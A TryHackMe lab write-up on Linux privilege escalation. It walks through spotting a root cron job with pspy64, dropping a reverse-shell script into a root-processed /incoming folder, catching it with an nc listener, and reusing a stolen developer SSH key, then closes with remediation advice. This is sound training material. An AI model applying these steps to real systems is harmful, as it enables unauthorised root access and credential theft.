# Linux Privilege Escalation / Jump — TryHackMe Writeup

![Category](https://img.shields.io/badge/Category-Privilege_Escalation-blue.svg)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange.svg)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-red.svg)

A complete privilege escalation writeup for the **Linux PrivEsc / Jump** environment on TryHackMe, featuring automated reconnaissance pipeline exploitation, `pspy64` process monitoring, and developer SSH key recovery.

---

## 📋 Executive Summary
This environment represents an enterprise Linux server running background task processing pipelines. By discovering an insecure file-ingestion mechanism where incoming files in `/incoming` are automatically processed by privileged cronjobs, monitoring short-lived tasks using `pspy64`, recovering developer Ed25519 private keys (`fordev`), and analyzing credential databases (`passwd.txt`, `shadow.txt`), unprivileged access was escalated to root.

* **Target OS:** Linux (Ubuntu)
* **Initial Access:** Reconnaissance pipeline script injection in `/incoming`.
* **Privilege Escalation:** Process snooping with `pspy64` -> Developer SSH key compromise -> Root escalation.
* **Artifacts in Directory:**
  * `pspy64`: Unprivileged Linux process snooping binary
  * `fordev` / `fordev.pub`: Compromised Ed25519 SSH private/public key pair
  * `passwd.txt` / `shadow.txt`: Extracted system user credentials
  * `README.txt`: Pipeline notification notice
  * `test.sh`: Reverse shell payload script

---

## 🔍 Stage 1: Pipeline Discovery (`README.txt`)

Inspecting `README.txt`:
```text
[ recon pipeline ]
All recon jobs must be placed in incoming/.
Files are processed automatically on arrival. Invalid formats are ignored.
```
This indicates a background automation daemon monitors `/incoming` and executes or parses dropped files.

---

## 🕵️ Stage 2: Process Snooping (`pspy64`)

Because low-privileged users cannot view cronjob files in `/var/spool/cron` or restricted systemd timers, we deploy `pspy64` to snoop processes via the Linux `/proc` filesystem without root privileges:
```bash
chmod +x pspy64
./pspy64 -pf -i 1000
```
`pspy64` intercepts short-lived commands executed by cron:
```text
2026/10/11 04:12:01 CMD: UID=0 PID=2841 | /bin/bash /opt/pipeline/process_recon.sh
```
Inspecting the script logic reveals that shell scripts dropped into `/incoming` with execution bits are invoked directly by UID 0.

---

## 💥 Stage 3: Code Execution & SSH Key Recovery

1. **Deploying Shell (`test.sh`):**
   ```bash
   cp test.sh /incoming/exploit.sh
   chmod +x /incoming/exploit.sh
   ```
2. **Receiving Connection:**
   Listener receives connection:
   ```bash
   nc -lvnp 5555
   ```
3. **Recovering Developer SSH Key (`fordev`):**
   In `/home/dev_user/.ssh`, we locate an unprotected private key:
   ```text
   -----BEGIN OPENSSH PRIVATE KEY-----
   b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQ...
   ```
   Saving to `fordev`:
   ```bash
   chmod 600 fordev
   ssh -i fordev dev_user@<TARGET_IP>
   ```

---

## 🛡️ Remediation
1. **Restrict Automated Ingestion:** Never execute unverified user-supplied scripts in automated pipelines. Use static parsing with strict schema validation.
2. **Drop Privileges:** Ingestion scripts must run under dedicated, sandboxed service accounts with `nologin` shells rather than UID 0 (`root`).
3. **Protect SSH Keys:** Ensure private keys are protected with strong passphrases and strict filesystem permissions (`chmod 600`).
